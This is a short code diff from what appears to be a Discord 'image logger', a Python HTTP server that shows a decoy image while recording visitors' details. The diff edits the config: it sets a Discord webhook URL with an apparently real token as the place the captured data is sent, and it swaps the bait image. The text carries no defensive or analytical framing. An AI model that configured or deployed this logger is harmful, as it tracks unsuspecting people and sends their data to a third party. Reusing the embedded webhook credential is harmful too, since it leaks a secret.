@@ -9,8 +9,8 @@ from http.server import BaseHTTPRequestHandler
  
  config = {
      # BASE CONFIG #
-     "webhook": "https://discord.com/api/webhooks/1362608025105338551/9UYbW8rNVlL4o6PhXyP89_O2V4xP6I4Mxm4d47XydrPg6QTsMHs-yrHvX551avbjfJx6-",
-     "image": "https://tenor.com/view/herry-gif-25940620",  # You can also have a custom image by using a URL argument
+     "webhook": "https://discord.com/api/webhooks/1362608025105338551/9UYbW8rNVlL4o6PhXyP89_O2V4xP6I4Mxm4d47XydrPg6QTsMHs-yrHvX551avbjfJx6",
+     "image": "https://www.newegg.com/insider/wp-content/uploads/windows_xp_bliss-wide.jpg",  # You can also have a custom image by using a URL argument
                                                 # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
      "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
  
